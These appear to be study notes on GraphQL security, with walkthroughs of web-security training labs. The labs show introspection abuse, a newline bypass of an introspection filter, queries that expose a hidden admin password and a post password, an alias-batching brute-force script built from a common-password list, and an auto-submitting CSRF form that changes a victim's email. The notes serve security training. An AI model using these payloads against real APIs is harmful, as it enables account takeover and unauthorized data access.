# GraphQL API
## What is GraphQL API?
GraphQL is an API query language that is designed to facilitate efficient communication between clients and servers. It enables the user to specify exactly what data they want in the response, helping to avoid the large response objects and multiple calls that can sometimes be seen with REST APIs.
All GraphQL operations use the **same endpoint**, and are generally sent as a `POST` request.

## What are GraphQL queries?
GraphQL queries retrieve data from the data store. They are roughly equivalent to `GET` requests in a REST API.
Queries usually have the following key components:
- A query operation type. This is technically optional but encouraged, as it explicitly tells the server that the incoming request is a query.
- A query name. This can be anything you want. The query name is optional, but encouraged as it can help with debugging.
- A data structure. This is the data that the query should return.
Optionally, one or more arguments. These are used to create queries that return details of a specific object (for example "give me the name and description of the product that has the ID 123").

The example below shows a query called `myGetProductQuery` that requests the `name`, and `description` fields of a product with the `id` of `123`.

    query myGetProductQuery {
        getProduct(id: 123) {
            name
            description
        }
    }

## What are GraphQL mutations?
Mutations change data in some way, either adding, deleting, or editing it. They are roughly equivalent to a REST API's `POST`, `PUT`, and `DELETE` methods.
Like queries, mutations have an operation type, name, and structure for the returned data. However, mutations always take an input of some type.

    #Example mutation request

    mutation {
        createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
            id
            name
            listed
        }
    }

    #Example mutation response

    {
        "data": {
            "createProduct": {
                "id": 123,
                "name": "Flamin' Cocktail Glasses",
                "listed": "yes"
            }
        }
    }

## Finding GraphQL endpoints
**Universal queries:** If you send `query{__typename}` to any GraphQL endpoint, it will include the string `{"data": {"__typename": "query"}}` somewhere in its response.
**Common endpoint names:** `/graphql`, `/api`, `/api/graphql`, `/graphql/api`, `/graphql/graphql` (if these common endpoints don't return a GraphQL response, you could also try appending `/v1` to the path).

> Note: GraphQL services will often respond to any non-GraphQL request with a "query not present" or similar error. You should bear this in mind when testing for GraphQL endpoints.
## Discovering schema information
**Probing for introspection:**

    #Introspection probe request

    {
        "query": "{__schema{queryType{name}}}"
    }

**Running a full introspection query:** the query below returns full details on all queries, mutations, subscriptions, types, and fragments. 

    #Full introspection query
    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }

Or in Burp, you can right click any GraphQL query, choose `QraphQL` $\to$ `Set Introspection query`

> Note: If introspection is enabled but the above query doesn't run, try removing the `onOperation`, `onFragment`, and `onField` directives from the query structure.

### LAB: Accessing private GraphQL posts
First run a full introspection query to the endpoint `/graphql/v1` using the given query.
Notice that there is an object named `BlogPost` with the `postPassword` field. Look at the blog page, only blogs with `id=1,2,4,5` are shown. Try using this query to look for blog with `id=3`:

    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            image
            title
            author
            date
            paragraphs
            postPassword
        }
    }

    {"id":3}

Found the `postPassword` field, submit its value to solve the lab.

### LAB: Accidental exposure of private GraphQL fields
First run a full introspection query to the endpoint `/graphql/v1` using the given query.
Found this function that returns an `User` object by specified `id`.

    {
      "name": "getUser",
      "description": null,
      "args": [
        {
          "name": "id",
          "description": null,
          "type": {
            "kind": "NON_NULL",
            "name": null,
            "ofType": {
              "kind": "SCALAR",
              "name": "Int",
              "ofType": null
            }
          },
          "defaultValue": null
        }
      ],
      "type": {
        "kind": "OBJECT",
        "name": "User",
        "ofType": null
      },
      "isDeprecated": false,
      "deprecationReason": null
    }

Contruct this query to look for the administrator account:

    query getUser {
        getUser(id: 1) {
            username
            password
        }
    }

The server response with the admin's username and password. Use it to login as administrator and delete user `carlos`.

### LAB: Finding a hidden GraphQL endpoint
Found the GraphQL endpoint at `/api`. Right click the request, choose `GraphQL` $\to$ `Set introspection query` to create a request that probe for introspection.
At first we got an error:

    {
        "errors": [
            {
            "locations": [],
            "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
            }
        ]
    }

Modify the query so that after `__schema` there is a new-line character (`%0a`). Resend this request to successfully access the introspection.
Notice the `getUser` query function, use it to look for Carlos' `id` and found out that Carlos' `id` is `3`:

    #Query
    query {
        getUser(id: 3){
            username
        }
    }

    #Response
    {
        "data": {
            "getUser": {
            "username": "carlos"
            }
        }
    }

Notice the `deleteOrganizationUser` mutation function, use it to delete user Carlos:

    mutation {
        deleteOrganizationUser(input:{id:3}){
            user{
                id
                username
            }
        }
    }

Specify the argument `input` like that because `deleteOrganizationUser` requires argument of type `DeleteOrganizationUserInput` which has an input field named `id`.

### LAB: Bypassing GraphQL brute force protections
Notice the GraphQL enpoint and the `login` mutation function:

    mutation login($input: LoginInput!) {
        login(input: $input) {
            token
            success
        }
    }

    {"input":{"username":"carlos","password":"123123"}}

Use this Javascript code to generate the aliases used for brute forcing:

    copy(
    `123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`
        .split(",")
        .map((element, index) =>
        `bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
            token
            success
        }`
            .replaceAll("$index", index)
            .replaceAll("$password", element)
        )
        .join("\n")
    );
    console.log("The query has been copied to your clipboard.");

Insert the clipboard inside this mutation function. It should look like this:

    mutation login {
        login(input:{password: "123456", username: "carlos"}){
            token
            success
        }
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
            token
            success
        }
        bruteforce1:login(input:{password: "password", username: "carlos"}) {
            token
            success
        }
        ...
    }

Look for index with `success:true` to found Carlos' password.

### LAB: Performing CSRF exploits over GraphQL
Notice the endpoint that the change email function is pointing to: `/graphql/v1`.When changing the `Content-Type` to `/application/x-www-form-urlencoded` the request is still accepted.
Craft this HTML to make use of the GraphQL endpoint and the `Content-Type:/application/x-www-form-urlencoded` header to change the victim's email:

    <form
        action="https://0a7b0022041aea1b82cdfbdd00b0009c.web-security-academy.net/graphql/v1"
        method="post"
    >
    <input
        type="hidden"
        name="query"
        value='mutation changeEmail{changeEmail(input:{email:"f@a.com"}){email}}'
    />
        <input type="hidden" value="Submit" />
    </form>
    <script>
        document.forms[0].submit();
    </script>


